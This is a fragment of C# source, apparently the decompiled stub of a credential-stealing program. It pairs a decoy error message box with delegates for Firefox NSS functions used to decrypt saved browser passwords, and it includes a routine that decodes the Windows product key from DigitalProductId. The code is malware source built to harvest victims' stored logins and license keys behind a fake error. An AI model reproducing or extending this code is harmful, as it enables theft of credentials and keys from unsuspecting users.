            MessageBox.Show(FakeErrorMessage, FakeErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate2();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref Stub.TSECItem data, ref Stub.TSECItem result, int cx);

        public class KeyDecoder
        {
            public static string DecodeProductKey(byte[] digitalProductId)
            {
                char[] chArray = new char[] { 
                    'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R', 'T', 'V', 'W', 'X', 
                    'Y', '2', '3', '4', '6', '7', '8', '9'
                 };
                char[] chArray2 = new char[0x1d];
                ArrayList list = new ArrayList();
                for (int i = 0x34; i <= 0x43; i++)
                {
                    list.Add(digitalProductId[i]);
                }
                for (int j = 0x1c; j >= 0; j--)
                {
                    if (((j + 1) % 6) == 0)
                    {
                        chArray2[j] = '-';
                    }
                    else
                    {
                        int index = 0;
                        for (int k = 14; k >= 0; k--)
                        {
                            int num5 = (index << 8) | ((byte) list[k]);
                            list[k] = (byte) (num5 / 0x18);
                            index = num5 % 0x18;
                            chArray2[j] = chArray[index];
                        }
                    }
                }
                return new string(chArray2);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }
    }
}

